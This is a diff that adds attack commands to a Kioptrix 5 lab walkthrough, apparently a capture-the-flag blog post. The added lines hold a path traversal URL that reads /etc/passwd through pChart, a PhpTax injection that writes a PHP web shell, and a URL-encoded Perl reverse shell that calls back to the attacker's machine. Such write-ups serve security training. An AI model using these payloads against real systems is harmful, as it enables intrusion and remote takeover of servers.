@@ -33,6 +33,11 @@ So we check the usr(User System Resources which contains user files and manually
 
 We read across the document and couldn't find ways to make changes to the configuration file remotely.
 
+```
+{http://172.168.48.136/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd }
+
+ ```
+
 ![Enumeration Results](/assets/images/Images/Kioptrix%205/09con.png)
 
 So we read the contents at the bottom indicated that the site was only compatible with mozilla/4.0, and our browser was 5.0 so it meant there were files we couldn't access (restricted content).
@@ -59,6 +64,10 @@ We opened the phptax redirect and it opened a website with a tax file from a Wil
 
 So we wrote a php script to inject a rce code that will inject a rce.php in the /data folder.
 
+```
+{http://172.168.48.136:8080/phptax/index.php?field=rce.php&newvalue=<%3Fphp passthru(%24_GET[cmd])%3B%3F>}
+
+```
 
 - field=rce.php - Specifies the file name to be created or manipulated. In this case, the file rce.php will be created in the ./data/ directory
 - newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E - This is the URL-encoded PHP code that will be written to the file rce.php.
@@ -66,7 +75,10 @@ So we wrote a php script to inject a rce code that will inject a rce.php in the 
 
 With the command execution successfully exploiting the Remote Code Execution (RCE) vulnerability in the PhpTax application we added a script to prompt a cmd parameter in the rce to provide the value of the id of the system with this code:
 
+```
+{http://172.168.48.136:8080/phptax/data/rce.php?cmd=id}
 
+```
 
 - /phptax/data/rce.php? - This is the path to the malicious file (rce.php) created in the ./data/ directory of the PhpTax application and file rce.php contains PHP code that allows command execution.
 
@@ -74,9 +86,11 @@ With the command execution successfully exploiting the Remote Code Execution (RC
 
 ![Enumeration Results](/assets/images/Images/Kioptrix%205/18%20return_cmd.png)
 
+```
+{http://172.168.48.136:8080/phptax/data/rce.php?cmd=perl -e 'use Socket%3B%24i%3D"172.168.48.134"%3B%24p%3D4444%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname("tcp"))%3bif(connect(S%2csockaddr_in(%24p%2cinet_aton(%24i))))%7bopen(STDIN%2c%22%3E%26S%22)%3bopen(STDOUT%2c%22%3E%26S%22)%3bopen(STDERR%2c%22%3E%26S%22)%3bexec(%22%2fbin%2fsh%20-i%22)%3b%7d%3b%27}
 
-
-
+```
+Then open a perl reverse shell that opens the cmd=id prompt with the reverse shell.
 
 This opened with a netcat on my terminal pulls a bash shell in the netcat listener.
 
